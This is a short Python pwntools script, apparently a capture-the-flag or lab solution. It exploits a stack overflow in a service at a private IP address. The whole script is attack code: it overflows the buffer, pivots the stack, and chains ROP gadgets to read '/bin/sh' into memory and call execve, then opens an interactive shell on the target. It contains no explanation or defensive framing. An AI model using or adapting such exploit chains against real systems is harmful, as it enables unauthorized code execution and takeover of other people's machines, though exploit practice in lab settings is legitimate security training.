#!/usr/bin/env python
from pwn import *

context.update(arch = 'amd64', os = 'linux', timeout = 1)
io = remote('172.17.0.3', 10001)

payload = ""
payload += p64(0x6161616161617970)
payload += 'a'*0x40
payload += p64(0x46f205)			# add esp, 0x58; ret
payload += 'a'*8
payload += p64(0x43ae29) 			# pop rdx; pop rsi; ret
payload +=p64(0x8) 					# rdx = 8
payload += p64(0x6c7079) 			# rsi = 0x6c7079
payload += p64(0x401823) 			# pop rdi; ret
payload += p64(0x0) 				# rdi = 0
payload += p64(0x437ea9) 			# mov rax, 0; syscall
payload += p64(0x46f208)			# pop rax; ret 
payload += p64(59)					# rax = 0x3b
payload += p64(0x43ae29) 			# pop rdx; pop rsi; ret
payload += p64(0x0) 				# rdx = 0
payload += p64(0x0) 				# rsi = 0
payload += p64(0x401823) 			# pop rdi; ret
payload += p64(0x6c7079) 			# rdi = 0x6c7079
payload += p64(0x437eae) 			# syscall

print io.recv()
io.send(payload)
sleep(0.1)
io.send('/bin/sh\x00')
io.interactive()
